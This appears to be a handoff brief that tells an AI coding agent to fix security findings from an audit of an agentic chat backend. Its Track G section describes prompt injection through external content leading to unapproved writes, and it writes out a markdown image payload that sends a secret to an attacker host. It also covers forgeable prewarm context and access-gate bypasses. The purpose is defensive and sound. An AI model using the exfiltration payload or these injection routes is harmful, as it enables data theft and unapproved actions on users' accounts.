<!-- tasker/20-agentic-chat-wave3-security-brief.md -->

# Task 20 — Agentic Chat Backend: Wave 3 (Security) + Wave 2 tail

**For:** a fresh agent in a new chat. This brief is self-contained — you do not need any prior conversation.
**Created:** 2026-07-04
**Type:** implementation handoff (execute the remaining agentic-chat backend fixes).

---

## 0. Read this first (context in 60 seconds)

There is a deep backend audit of the agentic chat system at:

- **`apps/web/docs/technical/audits/AGENTIC_CHAT_BACKEND_AUDIT_2026-07-01_DEEP.md`** ← the authoritative source. Every finding (D1…D11, S1…S17, C1…C8, O2…O16) is described there with `file:line` citations and CONFIRMED/SUSPECTED marks. **Read the "Severity summary" table + Theme 4/5 + the "Fix waves" section before starting.**
- Companion (original, lighter): `AGENTIC_CHAT_BACKEND_AUDIT_2026-07-01.md`.

**Already done & committed (do NOT redo):** Wave 1 + Wave 2 (Batches 1–3) — the entire data-integrity / false-success / cancellation / durability / LLM-robustness / transactional-create cluster (18 findings, tagged **FIXED** in the doc). Your job is **Wave 3 (Security)** plus a small **Wave 2 tail**.

**Entry points / hot files** (you will touch several; they are large and shared, so edit carefully):

- `apps/web/src/routes/api/agent/v2/stream/+server.ts` — the streaming endpoint (~4,400 lines).
- `apps/web/src/lib/services/agentic-chat-v2/stream-orchestrator/index.ts` — the turn loop.
- `apps/web/src/lib/services/agentic-chat/…` — tool execution, executors, gateway surface, tool registry.
- `packages/shared-agent-ops/src/…` — op policy/scope (`policy.ts`), gateway, ontology.
- `apps/web/src/lib/components/agent/AgentMessageList.svelte` + `apps/web/src/lib/utils/markdown.ts` — chat rendering.

---

## 1. Working conventions (follow these)

- **Package manager is `pnpm`, never npm.** Formatting: tabs, single quotes, no trailing commas, 100-col (Prettier). Svelte 5 runes only. Read neighboring code before writing.
- **Re-verify every finding against current code first.** The audit's line numbers were captured 2026-07-01 and have drifted after Waves 1–2. Find the real code; don't trust the citation blindly.
- **Add a test for every behavioral change.** Run targeted tests: `cd apps/web && pnpm exec vitest run <path>`. Typecheck: `cd apps/web && pnpm run check` (svelte-check).
- **KNOWN pre-existing noise — do not get blocked by it:** `pnpm run check` currently reports ~15 errors in **`apps/web/src/lib/services/admin/chat-session-audit-compact.ts`** (null-safety). That file is a **different workstream's** audit tooling, NOT part of this task. Ignore those 15; just make sure YOUR files add zero new errors. (There is also one long-standing warning in `routes/onboarding/+page.svelte` — also not yours.)
- **Migrations:** put new files in `supabase/migrations/` with a timestamp later than `20260702020000`, matching the style of recent migrations. After adding a migration, note that `pnpm gen:types` must run (don't run the full `pnpm gen:all` mid-task; just flag it).
- **Shared package dist is gitignored:** if you edit `packages/shared-agent-ops` or `packages/smart-llm`, note they must be rebuilt (`pnpm --filter=@buildos/shared-agent-ops build`) for the running app/worker to pick up changes.
- **Batch to avoid collisions.** `+server.ts` and `stream-orchestrator/index.ts` are edited by multiple findings. If you parallelize with sub-agents, give each a **disjoint file lane**; otherwise do it sequentially. Do NOT run two agents editing the same file at once.
- **Commit / review:** leave changes uncommitted for review unless the repo owner tells you to commit. Validate before handing back (targeted tests + `pnpm run check` scoped to your files).

---

## 2. Wave 2 tail — do these FIRST (small, unblock the rest)

1. **`pnpm gen:types`** for the three migrations already merged (`20260701020000` timing_metrics RLS, `20260702000000` last_progress_at + commit_started_at, `20260702010000` idempotency_key + `onto_task_create_atomic`). Then tighten the temporary `as never` / `as any` casts they left in `packages/shared-agent-ops/src/gateway/change-set.ts` (around the `commit_started_at` reads) and in `apps/web/src/routes/api/onto/tasks/create/+server.ts` (the `onto_task_create_atomic` call).
2. **Verify the S4 RLS migration landed live:** `select relrowsecurity from pg_class where relname='timing_metrics';` should be `true`. Confirm the admin timing dashboard (`/api/admin/chat/timing`) still reads (it relies on `is_admin()`).
3. **Add the missing D7 tests** (they were never written): (a) `onto_task_create_atomic` rolls back the task row when edge/assignee insertion fails (no orphan task); (b) a create with a duplicate `Idempotency-Key` returns the existing row instead of inserting a second. See `onto_task_update_atomic` + its route usage for the mirror pattern.
4. **(Optional, was deferred in D7):** `packages/shared-agent-ops/src/ontology/instantiation.service.ts` still inserts the project row FIRST — a mid-way crash leaves a visible half-built project. Lower-risk mitigation: insert the project row last / mark it incomplete until finalized. Only if cheap; note the tradeoff if you skip.

---

## 3. Wave 3 — Security hardening (the main work)

**Why this is the pass:** with data-integrity/durability done, the highest-severity remaining findings are all security, including the only two remaining **CRITICALs**. Theme: _the action side of interactive chat lacks the policy layer that Agent Runs already have._ Three tracks. Track G is the flagship; H and I can parallelize once G's design is set. Full detail per finding is in the audit doc's Theme 5 — cited below with the audit's (possibly-drifted) line numbers.

### Track G — Prompt-injection → mutation/exfiltration chain (flagship; S1 + S3 + S2 are one problem)

**Do S2 first — it's self-contained and closes the exfiltration half immediately.**

- **S2 (HIGH) — zero-click image exfiltration.** Assistant messages render via `{@html renderMarkdown(...)}` (`AgentMessageList.svelte:314,351`); `sanitizeOptions` allows remote `<img src>` with no scheme restriction (`utils/markdown.ts:39,50`). An injected `![](https://attacker/leak?d=SECRET)` auto-fetches attacker.com on render. **Fix:** in the assistant-message markdown profile, drop `img` (or restrict `src` to same-origin/`data:`), or add a chat-surface CSP `img-src`. Keep `renderBlogMarkdown` (trusted content) unchanged. Add a test asserting a remote-image URL is stripped/neutralized.

- **S1 (CRITICAL) — prompt-injection → immediate write, no approval.** Interactive chat commits writes immediately (`ontology-write-executor.ts` ~1339-1404) and does **not** consult `packages/shared-agent-ops/src/policy.ts` scope enforcement (the gateway / Agent-Run path does). Launch surfaces preload reads + writes together (`agentic-chat/tools/core/gateway-surface.ts` ~80-151). So instructions planted in external content (a calendar event description, a shared doc body, an MCP/`web_visit` result) execute writes with zero human approval. **Fix:** (a) route chat writes through the `policy.ts` scope layer; (b) gate destructive/bulk ops (delete, graph reorg) behind explicit confirmation; (c) default any turn that **ingested external/third-party content** to commit-**review** instead of commit-by-default. _Design decisions to make:_ where to inject the policy check (tool-execution-service vs executor construction), and how to track "this turn ingested external content" across rounds (a per-turn flag set when a read tool returns externally-authored text).

- **S3 (HIGH) — tool materialization has no write gate.** `tool_search` can load any tool by bare name and the on-miss path auto-executes it the same round (`stream-orchestrator/index.ts` ~1371-1466); `materializeGatewayTools` filters only dedup/flag, no read/write gate (`gateway-surface.ts` ~319-349). A nominally read-only turn can load-and-run `delete_calendar_event` mid-round. **Fix:** enforce a write/destructive allowlist in materialization keyed to the turn's scope; require confirmation before executing a just-materialized destructive op. Shares the "external content ingested" flag with S1.

_Sequence:_ S2 (ship alone) → then S1 + S3 together (shared design: the policy layer + the per-turn external-content flag both gates consult).

### Track H — Access & trust boundaries (parallel with G once its design is set)

- **C1 (HIGH) — ontology chats bypass the member-access gate.** `isProjectScopedContext` is true only for `project` (`agentic-chat/tools/…/scope.ts` ~52-56), but `resolveRpcContextType` maps `ontology`+projectId to the project RPC path (~72-82). The stream/prewarm member gate runs only for project-scoped contexts (`stream/+server.ts` ~2049, `prewarm/+server.ts` ~287), so `ontology` skips it; on RPC-null the loader silently falls back to RLS-scoped manual queries (`context-loader.ts` ~2988-3001), and RLS allows public reads. Net: an authenticated non-member can hydrate a public project's full context. **Fix:** run `checkProjectAccess` for any resolved projectId regardless of `contextType`; treat RPC-null on the project path as terminal (no RLS fallback); UUID-validate `focusEntityId`/`projectId` at the request boundary (a non-UUID focus id is a deliberate fallback-forcing lever).

- **C2 (HIGH) — client-supplied prewarm context trusted verbatim.** The stream endpoint accepts `prewarmedContext` and, if `version`/`key`/`created_at` gates pass, uses `context.data` directly as prompt context and persists it into `chat_sessions.agent_metadata` (`stream/+server.ts` ~2708-2725; validation only shape-checks — `context-cache.ts` ~105-122; freshness uses client `created_at` ~49-52). All gates are client-forgeable → self-service system-prompt injection + durable session poisoning. **Fix:** stop trusting `context.data` from the client — re-derive server-side (the `else` branch already does), or HMAC/nonce it like prepared-prompts; never persist a client-origin cache into `agent_metadata`; ignore client `created_at`.

- **S7 (MEDIUM) — archived-project fence bypass on `onto.project.update`.** `packages/shared-agent-ops/src/gateway/op-execution-gateway.entity-access.ts` (~141-149, ~26-96): when the target project isn't in the scoped `projectMap`, the fallback checks only user-level ownership and never consults `scope.project_ids`; `deleted_at IS NULL` is also dropped under `includeArchived`. **Fix:** require `scope.project_ids` membership in the fallback; re-apply `deleted_at IS NULL` when `includeArchived` is set.

### Track I — Abuse limits & secrets/PII hygiene (parallel; mostly independent)

- **S6 (MEDIUM) — no rate limiting anywhere.** Global limiter is commented out (`hooks.server.ts` ~37); only a per-**session** single-running-turn guard exists (`stream/+server.ts` ~2115-2162) → unlimited concurrent LLM streams per user (cost/DoS); unauthenticated gateway/bootstrap floods also write `security_events` rows. **Fix:** per-user concurrent-stream cap + token-bucket on the stream route; reuse `checkOAuthRateLimit` on the gateway/bootstrap routes.
- **S5 / S8 (HIGH/MEDIUM) — bootstrap token.** `apps/web/src/lib/server/agent-call/bootstrap-link.service.ts` (~176-184) stores a **plaintext** `boca_` bearer token at rest, never reaped (~231-235); the setup token travels in the URL path, fetched unauthenticated, multi-use for 30 min. **Fix:** encrypt the payload (reuse `calendar-token-crypto`), single-use atomic consume, reap expired rows in the retention cron.
- **Hygiene sweep (LOW–MEDIUM):** S9/S14 stop logging full tool args / search text (`stream/+server.ts` ~3406-3412 and orchestrator `tool-arguments.ts`) — use `previewToolArguments()`; S13 strip Postgres `details`/`hint` from model-facing errors (`agentic-chat/shared/error-utils.ts` ~28-45); S10/S11/S12 retention jobs for `chat_prompt_snapshots` / `chat_tool_executions` / `agentic_chat_prepared_prompts` (the cleanup fn `cleanup_expired_agentic_chat_prepared_prompts` exists but is never scheduled) + drop the duplicate `rendered_dump_text`; S15 add an EXISTS ownership check to the observability INSERT policies; S16 scope the `web_page_visits` cache per user; S17 remove the prod prompt-dump escape hatch (`FASTCHAT_LOCAL_PROMPT_DUMPS`).

**Suggested Wave 3 sequencing:** Wave 2 tail (§2) → **S2** → design + build **S1 + S3** (one PR / tight set) → Tracks H and I in parallel. Keep S1's policy-layer change and each migration in their own reviewable PRs.

---

## 4. Held for explicit go/no-go — do NOT start without approval

- **D4b (Wave 2 tail, infra)** — register the detached turn IIFE with `event.platform?.context?.waitUntil`; close the SSE stream even when detached; add a Vercel cron sweeper that fails turns stuck `running` past `last_progress_at + N` (the `last_progress_at` column already exists from migration `20260702000000`). _Needs:_ a cron entry in `vercel.json` + a sweeper route. **Risk: changes lambda lifecycle** — validate `waitUntil` availability on the pinned `nodejs22.x` runtime first. Bring a plan to the repo owner before implementing.

---

## 5. Later (not this task, for awareness)

- **Wave 4 — correctness polish:** O2/O3 (mutation-request heuristic false pos/neg; guard clobbering supervisor questions), O4/O5 (skill payload double-truncation), O9/O10 (alternating-loop repetition guard; sticky `hasWriteAttempt`), O11–O16; C3/C4/C5 (RPC-fallback parity; bounded fallback fetches; prepared-prompt amplification); tool-surface trim (the #1 prompt-size lever) + `+server.ts` decomposition.
- **Wave 5 — observability:** prewarm hit-rate dashboard + `cache_source` / `context_load_source` logging + D11 error-frame surfacing. **Worth pulling forward to run alongside Wave 3** so the injection-defense + rate-limit changes are measurable.

---

## 6. Definition of done for this task

- Wave 2 tail (§2 items 1–3) complete; item 4 done or explicitly skipped-with-reason.
- Track G (S2, S1, S3), Track H (C1, C2, S7), Track I (S6, S5/S8, hygiene sweep) implemented, each with tests where behavioral.
- `pnpm run check` adds **zero** new errors in your files (the ~15 pre-existing `chat-session-audit-compact.ts` errors are not yours).
- Targeted test suites green.
- The audit doc's Severity table + "Fix waves" section updated: mark each finding **FIXED (W3)** with a one-line note, mirroring how Waves 1–2 are recorded there.
- D4b left untouched (awaiting go/no-go).
- Any new migration flagged for `pnpm gen:types` + prod apply; any shared-package edit flagged for dist rebuild.
